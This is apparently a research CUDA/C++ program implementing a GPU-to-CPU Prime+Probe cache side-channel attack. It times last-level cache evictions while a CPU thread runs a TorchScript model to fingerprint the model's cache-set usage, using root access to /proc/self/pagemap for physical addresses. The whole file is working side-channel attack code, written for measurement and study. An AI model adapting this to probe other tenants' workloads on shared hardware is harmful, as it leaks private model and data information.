/*
 * prime_probe_ai_scan.cu
 *
 * REAL Prime+Probe: GPU attacker, CPU AI model as victim
 *
 * GPU (attacker):
 *   Phase 1 — PRIME : fills all ways of target LLC set with congruent lines
 *   Phase 2 — FLUSH : evicts own GPU L2 so probe is forced to CPU LLC/DRAM
 *   Phase 3 — PROBE : measures clock64() per congruent line
 *                     slow line → CPU model evicted it from CPU LLC
 *                     → GPU fingerprints which LLC sets the AI model uses
 *
 * CPU (victim):
 *   Runs AI model forward pass in CPU mode (weights in CPU RAM)
 *   Model weight reads map to specific LLC sets → evict GPU primed lines
 *
 * Two measurements per set per rep:
 *   baseline — GPU prime → flush → CPU idle → GPU probe
 *   attack   — GPU prime → flush → CPU runs model → GPU probe
 *
 * Ratio = attack_probe / baseline_probe
 * High ratio → model evicted those lines → model used that LLC set
 *
 * Usage:
 *   sudo ./prime_probe_ai_scan <model.pt> <target_set> <points>
 *                              <reps> <cache_kb> <ways>
 */

#include <torch/script.h>
#include <torch/torch.h>
#include <cuda_runtime.h>

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <string>
#include <algorithm>
#include <vector>
#include <thread>
#include <atomic>

#define ARRAY_SIZE      (16 * 1024 * 1024)  // 64MB managed
#define CACHELINE_INTS  16
#define MAX_CONGRUENT   8192
#define DEFAULT_LLC_KB  (12 * 1024)
#define DEFAULT_WAYS    16
// GPU L2 flush buffer: 16MB covers both RTX3060 (2.25MB) and A30 (6MB) L2
#define FLUSH_INTS      (4 * 1024 * 1024)

// ── Physical address helpers ──────────────────────────────────
static int vtop(void* vaddr, uint64_t* paddr) {
    long pgsz = sysconf(_SC_PAGESIZE);
    uint64_t vpn = (uint64_t)vaddr / pgsz;
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) return -1;
    uint64_t entry = 0;
    if (pread(fd, &entry, 8, vpn * 8) != 8) { close(fd); return -2; }
    close(fd);
    if (!(entry >> 63)) return -3;
    uint64_t pfn = entry & ((1ULL << 55) - 1);
    if (!pfn) return -4;
    *paddr = pfn * pgsz + ((uint64_t)vaddr % pgsz);
    return 0;
}

static int llc_set(void* addr, int cache_kb, int ways) {
    uint64_t pa = 0;
    if (vtop(addr, &pa) == 0)
        return (int)((pa / 64) % ((uint64_t)(cache_kb * 1024) / (64 * ways)));
    return -1;
}

// ── GPU Kernels ───────────────────────────────────────────────

// PRIME: fill all ways of LLC set with GPU's congruent lines
__global__ void prime_kernel(volatile int* data, const int* idx, int n) {
    int tid = blockIdx.x * blockDim.x + threadIdx.x;
    int stride = blockDim.x * gridDim.x;
    for (int pass = 0; pass < 4; pass++)
        for (int j = tid; j < n; j += stride) {
            volatile int v = data[idx[j]];
            (void)v;
        }
}

// FLUSH GPU L2: thrash large GPU buffer to evict prime lines from GPU L2
// After this, probe must fetch from CPU LLC (or DRAM if victim evicted it)
__global__ void flush_gpu_l2(int* buf, int n) {
    int tid = blockIdx.x * blockDim.x + threadIdx.x;
    int stride = blockDim.x * gridDim.x;
    for (int i = tid; i < n; i += stride)
        buf[i] ^= 1;
}

// PROBE: single thread, serial access per congruent line, clock64() timing
// slow line = CPU victim evicted it from CPU LLC → GPU must fetch from DRAM
__global__ void probe_kernel(volatile int* data, const int* idx, int n,
                              uint64_t* timings) {
    if (threadIdx.x != 0 || blockIdx.x != 0) return;
    for (int i = 0; i < n; i++) {
        __threadfence_system();
        uint64_t t0 = clock64();
        volatile int v = data[idx[i]];
        __threadfence_system();
        uint64_t t1 = clock64();
        timings[i] = t1 - t0;
        (void)v;
    }
}

// ── Stats ─────────────────────────────────────────────────────
struct Stats { uint64_t med, p99, maxv; };
static Stats compute(std::vector<uint64_t>& s) {
    std::sort(s.begin(), s.end());
    int n = s.size();
    return { s[n/2], s[(int)(0.99*(n-1))], s[n-1] };
}

// ── CPU victim thread ─────────────────────────────────────────
static std::atomic<bool> g_start_victim{false};
static std::atomic<bool> g_victim_done{false};
static std::atomic<bool> g_victim_run{true};

void victim_thread_fn(torch::jit::script::Module* model,
                      std::vector<torch::jit::IValue> inputs) {
    while (g_victim_run.load()) {
        // Wait for GPU to signal: prime+flush done, ready for victim
        while (!g_start_victim.load() && g_victim_run.load()) {}
        if (!g_victim_run.load()) break;
        g_start_victim.store(false);

        // Run ONE forward pass on CPU — this is the "secret" computation
        // Model weights in CPU RAM → accessed via CPU LLC → evicts GPU primed lines
        torch::NoGradGuard ng;
        model->forward(inputs);

        // Signal GPU: victim done, ready to probe
        g_victim_done.store(true);
    }
}

// ── Main ──────────────────────────────────────────────────────
int main(int argc, char** argv) {
    if (argc < 3) {
        fprintf(stderr,
            "Usage: %s <model.pt> <target_set> [points] [reps] "
            "[cache_kb] [ways]\n", argv[0]);
        return 1;
    }

    const char* model_path = argv[1];
    int target_set = atoi(argv[2]);
    int points     = (argc > 3) ? atoi(argv[3]) : 64;
    int reps       = (argc > 4) ? atoi(argv[4]) : 64;
    int cache_kb   = (argc > 5) ? atoi(argv[5]) : DEFAULT_LLC_KB;
    int ways       = (argc > 6) ? atoi(argv[6]) : DEFAULT_WAYS;

    printf("=== PRIME+PROBE AI SCAN ===\n");
    printf("Model: %s\nSet: %d  Points: %d  Reps: %d\n\n",
           model_path, target_set, points, reps);

    // ── Load model on CPU (victim runs on CPU, weights in CPU RAM) ──
    printf("[Model] Loading %s on CPU...\n", model_path);
    torch::jit::script::Module model;
    try {
        model = torch::jit::load(model_path, torch::kCPU);
        model.eval();
    } catch (const c10::Error& e) {
        fprintf(stderr, "Failed to load: %s\n", e.what());
        return 1;
    }
    printf("[Model] Loaded OK (CPU mode)\n");

    // ── Build CPU input tensors ──
    std::string mpath(model_path);
    std::vector<torch::jit::IValue> inputs;
    if (mpath.find("distilbert") != std::string::npos) {
        inputs.push_back(torch::randint(0, 30522, {2, 128},
                         torch::TensorOptions().dtype(torch::kLong)));
        inputs.push_back(torch::ones({2, 128},
                         torch::TensorOptions().dtype(torch::kLong)));
    } else if (mpath.find("minitransformer") != std::string::npos) {
        inputs.push_back(torch::randint(0, 30522, {2, 128},
                         torch::TensorOptions().dtype(torch::kLong)));
    } else if (mpath.find("tinyyolo") != std::string::npos) {
        inputs.push_back(torch::randn({1, 3, 416, 416}));
    } else {
        inputs.push_back(torch::randn({2, 3, 224, 224}));
    }

    // ── Warmup CPU inference ──
    printf("[Model] Warming up CPU inference...\n");
    { torch::NoGradGuard ng; for (int i=0;i<3;i++) model.forward(inputs); }
    printf("[Model] Warmup done\n\n");

    // ── Allocate managed memory (prime/probe array, stays on CPU) ──
    int* data = nullptr;
    cudaMallocManaged(&data, ARRAY_SIZE * sizeof(int));
    for (int i = 0; i < ARRAY_SIZE; i++) data[i] = i;
    cudaMemPrefetchAsync(data, ARRAY_SIZE * sizeof(int), cudaCpuDeviceId);
    cudaDeviceSynchronize();

    // ── Find congruent indices (pagemap, needs root) ──
    printf("[Prime] Scanning congruent lines for set %d...\n", target_set);
    std::vector<int> cong;
    for (int i = 0; i < ARRAY_SIZE; i += CACHELINE_INTS) {
        if (llc_set((void*)&data[i], cache_kb, ways) == target_set) {
            cong.push_back(i);
            if ((int)cong.size() >= MAX_CONGRUENT) break;
        }
    }
    if ((int)cong.size() < ways) {
        fprintf(stderr, "Not enough congruent lines: %d\n", (int)cong.size());
        cudaFree(data); return 1;
    }
    int n_used = std::min(points, (int)cong.size());
    printf("[Prime] Found %d lines, using %d\n\n", (int)cong.size(), n_used);

    // Copy indices to GPU-accessible memory
    int* idx_dev = nullptr;
    cudaMallocManaged(&idx_dev, n_used * sizeof(int));
    for (int i = 0; i < n_used; i++) idx_dev[i] = cong[i];
    cudaMemPrefetchAsync(idx_dev, n_used * sizeof(int), 0);
    cudaDeviceSynchronize();

    // GPU-only flush buffer
    int* flush_buf = nullptr;
    cudaMalloc(&flush_buf, FLUSH_INTS * sizeof(int));
    cudaMemset(flush_buf, 0, FLUSH_INTS * sizeof(int));

    // Per-line probe timings (managed so CPU can read)
    uint64_t* timings = nullptr;
    cudaMallocManaged(&timings, n_used * sizeof(uint64_t));

    // ── Start CPU victim thread ──
    std::thread vthr(victim_thread_fn, &model, inputs);

    // ── CSV output ──
    std::string mp(model_path);
    std::string mname = mp.substr(mp.rfind('/')+1);
    mname = mname.substr(0, mname.size()-3);

    char csv_path[512];
    snprintf(csv_path, sizeof(csv_path),
             "results/pp_ai_%s_set%d.csv", mname.c_str(), target_set);
    FILE* fp = fopen(csv_path, "w");
    if (!fp) { perror("fopen"); return 1; }
    fprintf(fp, "order,index,model,set_id,"
                "baseline_median,attack_median,median_ratio,"
                "baseline_p99,attack_p99,p99_ratio,"
                "baseline_max,attack_max,max_ratio\n");

    // ── Prime+Probe loop ──────────────────────────────────────
    // For each rep: baseline (CPU idle) then attack (CPU runs model)
    // Accumulate per-line timings across all reps
    std::vector<std::vector<uint64_t>> base_t(n_used), atk_t(n_used);

    for (int r = 0; r < reps; r++) {

        // ── BASELINE: prime → flush → CPU idle → probe ────────
        prime_kernel<<<8, 256>>>(data, idx_dev, n_used);
        cudaDeviceSynchronize();
        flush_gpu_l2<<<16, 256>>>(flush_buf, FLUSH_INTS);
        cudaDeviceSynchronize();

        usleep(500);  // short idle (match approximate model inference time)

        probe_kernel<<<1, 1>>>(data, idx_dev, n_used, timings);
        cudaDeviceSynchronize();
        for (int i = 0; i < n_used; i++)
            base_t[i].push_back(timings[i]);

        // ── ATTACK: prime → flush → CPU runs model → probe ────
        prime_kernel<<<8, 256>>>(data, idx_dev, n_used);
        cudaDeviceSynchronize();
        flush_gpu_l2<<<16, 256>>>(flush_buf, FLUSH_INTS);
        cudaDeviceSynchronize();

        // Signal victim: run one forward pass
        g_victim_done.store(false);
        g_start_victim.store(true);
        // Wait for victim to complete
        while (!g_victim_done.load()) {}

        probe_kernel<<<1, 1>>>(data, idx_dev, n_used, timings);
        cudaDeviceSynchronize();
        for (int i = 0; i < n_used; i++)
            atk_t[i].push_back(timings[i]);
    }

    // Stop victim thread
    g_victim_run.store(false);
    g_start_victim.store(true);  // unblock if waiting
    vthr.join();

    // ── Write CSV ─────────────────────────────────────────────
    auto ratio = [](uint64_t a, uint64_t b) -> double {
        return b > 0 ? (double)a / b : 0.0;
    };
    for (int i = 0; i < n_used; i++) {
        Stats b = compute(base_t[i]);
        Stats a = compute(atk_t[i]);
        fprintf(fp, "%d,%d,%s,%d,%llu,%llu,%.6f,%llu,%llu,%.6f,%llu,%llu,%.6f\n",
                i, cong[i], mname.c_str(), target_set,
                (unsigned long long)b.med,  (unsigned long long)a.med,  ratio(a.med,  b.med),
                (unsigned long long)b.p99,  (unsigned long long)a.p99,  ratio(a.p99,  b.p99),
                (unsigned long long)b.maxv, (unsigned long long)a.maxv, ratio(a.maxv, b.maxv));
    }
    fclose(fp);
    printf("Saved: %s\n", csv_path);

    cudaFree(idx_dev); cudaFree(flush_buf);
    cudaFree(timings); cudaFree(data);
    return 0;
}
